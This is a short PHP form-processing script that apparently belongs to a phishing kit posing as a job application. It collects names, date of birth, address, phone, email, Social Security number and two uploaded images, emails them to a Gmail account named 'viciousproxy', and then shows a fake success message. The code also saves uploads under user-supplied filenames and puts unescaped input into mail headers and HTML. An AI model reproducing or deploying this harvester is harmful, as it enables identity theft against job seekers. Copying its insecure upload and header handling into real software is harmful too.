<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
                                     
                                     $fname  = $_POST["fname"];

                                     $oname = $_POST["oname"];

                                     $email = $_POST["email"];

                                     $phone = $_POST['phone'];

                                     $dobirth = $_POST['dobirth'];

                                     $jobtitle = $_POST['jobtitle'];

                                     $ssn = $_POST['ssn'];

                                     $address = $_POST['address'];

                                     $bathrooms = $_POST['bathrooms'];

                                     




  if($_FILES['filea'] && $_FILES['fileb'] !== null){
      $errors= array();

      $file_namea = $_FILES['filea']['name'];
      $file_sizea = $_FILES['filea']['size'];
      $file_tmpa = $_FILES['filea']['tmp_name'];
      $file_typea = $_FILES['filea']['type'];

      $file_nameb = $_FILES['fileb']['name'];
      $file_sizeb = $_FILES['fileb']['size'];
      $file_tmpb = $_FILES['fileb']['tmp_name'];
      $file_typeb = $_FILES['fileb']['type'];
 
      $file_exttmp= explode('.', $file_namea);
      $file_exttmpb= explode('.', $file_nameb);

       $file_ext  = strtolower(end($file_exttmp));
       $file_extb  = strtolower(end($file_exttmpb));

      $extensions= array("jpeg","jpg","png");
      
      if(in_array($file_ext,$extensions)=== false){
         $errors[]="extension not allowed, please choose a JPEG, JPG or PNG file.";
      }
       if(in_array($file_extb,$extensions)=== false){
         $errors[]="extension not allowed, please choose a JPEG, JPG or PNG file.";
      }
      
      // if($file_sizea > 1310720) {
      //    $errors[]='File size must not exceed 10 MB';
      // }

      // if($file_sizeb > 1310720) {
      //    $errors[]='File size must not exceed 10 MB';
      // }
      
      if(empty($errors)==true) {
         move_uploaded_file($file_tmpa,"uploads/".$file_namea);
         move_uploaded_file($file_tmpb,"uploads/".$file_nameb);
         // echo "Success";

         $sendmessage = '

<p>You Have a new form submission </p><br>

 <p>First Name:- '.$fname.'</p>
  <p>Other Names:- '.$oname.'</p>
   <p>Email:- '.$email.'</p>
    <p>Phone:- '.$phone.'</p>
     <p>Date of Birth:- '.$dobirth.'</p>
      <p>Job Title:- '.$jobtitle.'</p>
       <p>SSN:- '.$ssn.'</p>
        <p>Address:- '.$address.'</p>
         <p>Have you received covid-19:- '.$bathrooms.'</p>
';



// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: submission <viciousproxy@gmail.com' . "\r\n".
    'Reply-To: '.$email. "\r\n";


    if (mail("viciousproxy@gmail.com","submission",$sendmessage,$headers)) {
        

        header("location: index.php?success=Your Application was Submitted Successfully");


    }else{

        echo "an error occured mail not sent";

    }
        


      }else{
         print_r($errors);
      }
   }

 }